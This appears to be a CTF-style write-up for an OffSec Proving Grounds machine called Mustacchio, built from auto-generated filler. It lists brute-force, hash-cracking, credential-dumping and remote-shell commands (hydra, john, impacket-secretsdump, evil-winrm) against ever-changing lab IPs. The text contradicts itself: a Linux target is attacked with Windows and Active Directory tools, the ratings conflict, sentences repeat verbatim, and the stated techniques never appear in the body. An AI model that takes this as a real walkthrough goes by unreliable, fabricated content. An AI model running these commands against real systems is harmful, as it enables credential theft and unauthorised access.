---
TitleSEO: "OffSec Proving Grounds — Mustacchio (Insane Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Mustacchio (Insane Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Mustacchio. LAPS Abuse and Constrained Delegation to achieve insane compromise on Linux."
Keywords: "hackthebox, medium, offsec, insane"
URL: "https://zurefx.github.io/writeups/htb-mustacchio-722.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mustacchio-722/"
Date: "2025-03-27"
Tags: "HackTheBox, Medium, OffSec, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-mustacchio-722"
Permalink: "/writeups/htb-mustacchio-722.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Mustacchio** is rated **Insane** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.19.241.118`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). The kernel version was outdated and vulnerable to a publicly known exploit.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.45.41.209 -u administrator -p 'P@ssw0rd!' --shares
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.115.84.67 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.128.178.28
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.23.216.175/FUZZ
crackmapexec smb 10.113.3.45 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.14.39.215/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.69.53 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.94.101.66 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.59.250.91 -u administrator -p 'P@ssw0rd!'
```

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI). The database credentials were hardcoded in the application source code.

Key finding: **Remote Code Execution**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.125.135.119/FUZZ
gobuster dir -u http://10.61.11.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p110,464,139 10.27.162.159 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.1.252
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.75.220.175 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
gobuster dir -u http://10.58.217.206/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.122.1.105
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.163.164
```

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `evil-winrm`
- `pwncat`
- `smbclient`
- `wpscan`
- `john`
- `burpsuite`
- `nmap`

### Key Takeaways

- LAPS Abuse
- Constrained Delegation
- Remote Code Execution
- NTLM Relay
